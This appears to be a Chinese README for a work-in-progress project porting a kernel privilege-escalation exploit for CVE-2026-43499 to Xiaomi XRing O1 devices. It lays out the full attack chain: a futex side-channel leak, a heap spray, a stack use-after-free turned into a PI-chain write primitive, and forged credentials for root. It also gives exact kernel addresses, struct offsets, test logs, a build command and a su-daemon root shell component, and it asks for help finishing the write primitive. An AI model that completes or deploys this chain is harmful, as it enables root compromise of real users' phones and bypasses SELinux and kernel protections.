# CVE-2026-43499 (GhostLock) — XRing O1 利用研究

> 目标: Xiaomi Pad 7 Ultra (jinghu) / Xiaomi 15S Pro (dijun), XRing O1 SoC
> 内核: 6.6.77-android15-8-g5770c661275f-abogki443185593-4k
> 参考: Littlenine Ennea 的 dijun 成功案例
> 性质: 内核安全研究 / 漏洞利用移植

## 攻击链

```
[1] kernelsnitch 泄露 mm_struct (futex hash 侧信道)
    ↓ 不依赖任何设备接口, 纯侧信道
[2] prepare_good_kernel_page 堆喷射 (fake_task/fake_w0/fake_fops)
    ↓ skb spray 到内核 SLUB
[3] futex_wait_requeue_pi 留下 dangling pi_blocked_on (栈 UAF)
    ↓ rt_mutex_cleanup_proxy_lock 跳过 remove_waiter
[4] pselect 复用同一栈, core_sys_select 覆盖 waiter 字段
    ↓ waiter->lock = &pselect_user_lock (用户空间, PAN 不阻止)
[5] consumer sched_setattr 触发 rt_mutex_adjust_prio_chain
    ↓ PI 链: waiter→lock→owner(fake_task)→fake_w0.pi_tree
[6] rb_insert 写入 *(target) = &栈waiter.pi_tree_entry (栈地址, 非可控值!)
    ↓ 只能写栈地址, 不能直接写 0/init_cred
[7] 让 pi_blocked_on 指向 spray 页面的 fake_w0 + 伪造 cred → 写指针槽 = &fake_w0.pi_tree_entry
    ↓ task->cred/real_cred 指向伪造 cred (uid=0) → root
```

## 真机测试进度 (2026-07-18)

分阶段测试 (test_minimal.so STAGE 1-7):

| 阶段 | 测试内容 | 结果 |
|---|---|---|
| STAGE 1 | 基础初始化 (disable_rseq/set_limit/pin_to_core) | OK |
| STAGE 2 | futex 基础 (FUTEX_LOCK_PI/UNLOCK_PI) | OK |
| STAGE 3 | kernelsnitch_setup (cpu_count=10) | OK |
| STAGE 4 | clone_leak_child (find_collisions) | OK |
| STAGE 5 | bruteforce 泄露 mm_struct | OK ★ 泄露成功 |
| STAGE 6 | prepare_good_kernel_page (spray) | OK ★ 页面准备好 |
| STAGE 7 | run_main_route_threads (PI 链触发) | OK ★ consumer 40次成功 |

**kernelsnitch 泄露的 mm_struct 地址示例**: ffffff80186c5500, ffffff8109969400, ffffff818fe72d00

**PI 链触发日志**:
```
pselect returned attempt=1 ret=0 errno=0 calls=40 success=40 delay=50000
```

## 当前卡点 (2026-07-18 已确认)

### 1. PI 链写入值是栈地址, 不是 write_pc (已确认, 最关键)

**反汇编 chain_disasm.txt 确认**: `rt_mutex_adjust_prio_chain` 的 rb_insert (行193) 写的是 `str x25, [x11, x13]`,
其中 x25 = `task->pi_blocked_on` 指向的 waiter 的 pi_tree_entry 地址 (栈地址)。

**真机验证** (STAGE=7, 栈 painting val=0):
```
CMP_REQUEUE_PI ret=1       ← UAF 触发
waiter WAIT_REQUEUE_PI ret=0 ← UAF 确认
stack-painted val=0 tgt=SELINUX_ENFORCING-8  ← 栈 painting 正确
pselect returned calls=40 success=40  ← PI 链触发
enforce AFTER=1 (仍 Enforcing)  ← 写入失败 (栈地址非0)
```

**结论**: PI 链写入原语**只能写栈地址**, 无法写 0 或 init_cred。这正是 dijun "两次 walk + 伪造 cred" 的原因。

### dijun 路线的真正含义

```
walk#1: *(task->real_cred) = &fake_w0.pi_tree_entry (spray 页面已知地址)
walk#2: *(task->cred)      = &fake_w0.pi_tree_entry
        其中 fake_w0 页面伪造了 cred 结构 (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
```

要让写入可控: 让 `task->pi_blocked_on` 指向 **spray 页面的 fake_w0** (而非栈 waiter),
这样 x25 = &fake_w0.pi_tree_entry (已知地址), 且 fake_w0 页面可伪造 cred。

### 2. mm_struct → task_struct (读 mm->owner)

kernelsnitch 泄露的是 mm_struct 地址。要写 task->cred 需要知道 task_struct 地址, 这需要读 mm_struct + 0x408 (mm->owner)。

但所有已知内核读路径都不可用:
- configfs_read_once 有 bug (见踩坑)
- /dev/ashmem 被 SELinux 拦截 (Permission denied)
- /proc/self/stat 的 kstkesp=0 (kptr_restrict)
- BPF/debugfs 不可读

可用资源: /dev/uhid (crw-rw-rw-, 所有人可读写) — 待研究

### 3. ashmem SELinux 拦截

`/dev/ashmem` 权限 666 但 SELinux 拦截 shell 域 open。阻止了 fops 路线的 configfs 验证。

cred 直写不需要 ashmem 验证, 但读取 mm->owner 需要。

## 踩的坑

### 坑 1: configfs_read_once 失效不是 Android 16 修补

反汇编 configfs_bin_read_iter (0xffffffc080488c9c) 确认:
- CFG_* 偏移正确 (0x50/0x58/0x60/0x64 完全匹配)
- 失效原因是代码 bug: 设 needs_read_fill=0 + 不设 buffer_size → 返回 0
- 这个 bug 在 Pixel 上也存在, configfs_read_once 可能从未成功过
- 早期文档 "Android 16 已修补 configfs" 是误判

### 坑 2: 路线偏差 (fops 劫持 vs cred 直写)

- dijun 走 cred 直写: mm leaked → 两次 walk 写 task->cred/real_cred=init_cred
- jinghu 走 fops 劫持: 写 ashmem_misc_fops → configfs 验证 → leak_kernel_base → install_root
- fops 路线依赖 configfs (致命依赖), cred 直写更简洁

### 坑 3: page_base=0 问题

test_minimal STAGE 6 设置了 page_base, 但 STAGE 7 do_pselect_fake_lock_route 看到的是 0。原因不明 (可能多线程可见性或编译器优化)。解决: STAGE 7 重新调 prepare_good_kernel_page。

### 坑 4: pr_error 调 exit(-1)

SYSCHK 失败时 pr_error 调 exit(-1), 导致 ashmem open 失败后进程退出, 无法看到后续结果。解决: 重定义 pr_error 不 exit, 或改 open_ashmem_device 不 SYSCHK。

### 坑 5: rt_mutex_waiter 布局

反汇编验证: pi_tree_entry 在 +0x28 (不是 +0x18), 多了 prio/deadline 字段。fake_task.pi_blocked_on 必须指向 fake_w0 结构体起始 (非 pi_tree_entry), 否则第二跳读 lock 字段错位。

### 坑 6: pselect 不阻塞

readfds 全零 + exceptfds=NULL → do_select 无 fd 检查立即返回 ret=0。修复: exceptfds 设 pipe read end, pselect 阻塞到 timeout。

## 关键数据

### 地址 (KASLR=0, vmlinux→runtime 减 0xc080000000)
```
KIMAGE_TEXT_BASE  = 0xffffffc080000000
init_task         = 0xffffff80020de280
init_cred         = 0xffffff80020f0548
selinux_state     = 0xffffff8002315f68
ashmem_misc_fops  = 0xffffff800223b5e8
```

### task_struct 偏移
```
cred=+0x818  real_cred=+0x820  pi_blocked_on=+0x938
pi_waiters=+0x920  real_parent=+0x628  comm=+0x830
```

### mm_struct 偏移
```
owner=+0x408 (MM_OWNER_OFF)
```

### rt_mutex_waiter 布局 (反汇编验证)
```
+0x00 tree_entry (rb_node 24B)
+0x18 prio (u32)
+0x20 deadline (u64)
+0x28 pi_tree_entry (rb_node 24B) ← PI 树遍历用此
+0x40 pi_prio (u32)
+0x50 task (ptr)
+0x58 lock (ptr) ← 关键字段
```

### 写入原语 (已确认)
```
set_pselect_write(target-8, value, 0)
→ fake_w0.pi_tree.rb_left = target-8
→ fake_w0.pi_tree.__rb_parent_color = value
→ PI 链 rb_insert: *(target) = &栈waiter.pi_tree_entry (栈地址, 非 value!)
```

要让写入可控: 让 task->pi_blocked_on 指向 spray 页面的 fake_w0 (而非栈 waiter),
则 rb_insert 写 &fake_w0.pi_tree_entry (已知地址), 且 fake_w0 页面可伪造 cred。

### 反汇编关键函数
```
ashmem_open            = 0xffffffc080c7af5c (struct ashmem_area=0xdc0, name@+0x0)
configfs_bin_read_iter = 0xffffffc080488c9c
configfs_read_iter     = 0xffffffc080488978
rt_mutex_adjust_prio_chain = 0xffffffc081052868 (rb_insert 行193: str x25,[x11,x13])
rt_mutex_cleanup_proxy_lock = 0xffffffc081052634
```

## 待办 (需要做的工作)

### 优先级 1: 让写入原语可控 (pi_blocked_on → fake_w0)
当前 rb_insert 写栈地址。需让 `task->pi_blocked_on` 指向 spray 页面的 fake_w0:
- 栈 painting 覆盖栈 waiter 的 pi_blocked_on 字段 (+0x50) 指向 fake_w0
- 在 fake_w0 页面伪造 cred 结构 (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
- 两次 walk 写 real_cred/cred 指针槽 = &fake_w0.pi_tree_entry

### 优先级 2: 解决 mm->owner 读取
找到不依赖 configfs/ashmem 的内核读方法, 读 mm_struct+0x408 拿 task_struct。候选: /dev/uhid、perf_event、eBPF。

### 优先级 3: child mm → parent task
kernelsnitch 在 clone_leak_child 里跑, 泄露的是 child mm。要写 parent cred, 需读 child task->real_parent (+0x628) 拿 parent task_struct。或改 kernelsnitch 在 parent 跑。

### 优先级 4: 多次 walk (slot 机制)
dijun 用两次 walk (slot_idx=1 写 real_cred, slot_idx=2 写 cred+selinux)。需实现 slot 机制。

### 优先级 5: brk #0x800 crash
rt_mutex_setprio 在 pi_blocked_on 非空路径触发 BUG (约 20 轮)。dijun 用 csettle_us=500 (微秒级时序) 避免。

## 文件清单

```
share-poc-XRing-O1/
├── README.md              项目总览 (攻击链/进度/坑/关键数据/待办)
├── RESEARCH_NOTES.md      研究说明 (漏洞原理/技术路线/难点突破)
├── docs/
│   └── findings.md        关键发现汇总 (configfs bug/kernelsnitch工作/PI链写入问题)
├── src/                   完整源码 (可编译)
│   ├── test_minimal.c     分阶段测试程序 (STAGE 1-7 隔离 panic 点)
│   ├── main_cred.c        cred 直写框架 (run_exploit 3次walk写cred)
│   ├── target.h           jinghu 偏移配置 (地址/struct偏移)
│   ├── common.h           核心头文件 (全局变量声明/宏定义/extern声明)
│   ├── util.c             kernelsnitch封装 + prepare_kernel_page + configfs_read_once
│   ├── fops.c             do_pselect_fake_lock_route + PI链触发 + cfi验证
│   ├── slide.c            KASLR bypass (boot_id写入验证)
│   ├── pipe.c             pipe阶段 (install_pipe_physrw)
│   ├── root.c             install_android_root (提权后root安装)
│   ├── offset.h           target配置入口 (include target.h)
│   ├── su_daemon.c        su daemon (root shell服务)
│   ├── su_blob.S          嵌入su_daemon二进制 (.incbin,需build/embed/资源)
│   ├── wallpaper_blob.S   嵌入wallpaper二进制 (.incbin,需assets/资源)
│   └── kernelsnitch/      kernelsnitch leak核心实现 (futex hash侧信道)
│       ├── kernelsnitch.h  泄露mm_struct完整实现 (450行,bruteforce搜索)
│       ├── futex_hash.h    futex哈希函数 (hash桶计算)
│       ├── timeutils.h     时间测量工具 (rdtsc等)
│       └── utils.h         pr_info/pr_error/SYSCHK等宏定义
├── disasm/                关键函数反汇编 (从vmlinux_extracted提取)
│   ├── chain_disasm.txt   ★ rt_mutex_adjust_prio_chain (PI链核心!确认rb_insert写入值)
│   ├── do_select_disasm.txt   do_select (pselect栈布局,waiter覆盖位置)
│   ├── do_select_full_disasm.txt  do_select完整反汇编
│   ├── core_sys_select_disasm.txt  core_sys_select (保存寄存器覆盖waiter字段)
│   ├── futex_requeue_full.txt  futex_wait_requeue_pi完整流程 (栈UAF触发)
│   ├── futex_wait_requeue_pi_full.txt  futex_wait_requeue_pi (漏洞触发点)
│   └── adjust_pi_disasm.txt  rt_mutex_adjust_pi (PI链入口)
└── refs/                  参考数据
    ├── kallsyms.txt       内核符号表 (766字节,部分关键符号)
    └── kernel_config.txt  内核配置 (219KB,/proc/config.gz提取)
```

### 编译说明

su_blob.S/wallpaper_blob.S 的 .incbin 资源 (build/embed/su_daemon_aarch64_pie, assets/wallpaper.webp) 未包含在仓库中。编译需要从 CyberMeowfia 上游 (IonStack/CVE-2026-43499/exploit/) 获取这两个资源文件。

编译命令:
```bash
# 需在 CyberMeowfia/exploit 目录下 (提供 incbin 资源)
NDK=android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64
clang --target=aarch64-linux-android35 --sysroot=$NDK/sysroot \
  -O2 -fPIC -I src -DTARGET_CONFIG_H="targets/jinghu/target.h" \
  src/test_minimal.c src/main.c src/util.c src/slide.c src/fops.c \
  src/pipe.c src/root.c src/su_blob.S src/wallpaper_blob.S \
  -shared -o test_minimal.so -pthread -fuse-ld=lld
```

## 联系

有研究兴趣或思路的欢迎讨论。核心求助点: **让 PI 链写入原语可控 (pi_blocked_on→fake_w0 + 伪造 cred) + mm->owner 内核读取**。

---

*本研究仅供安全研究与防御目的。*
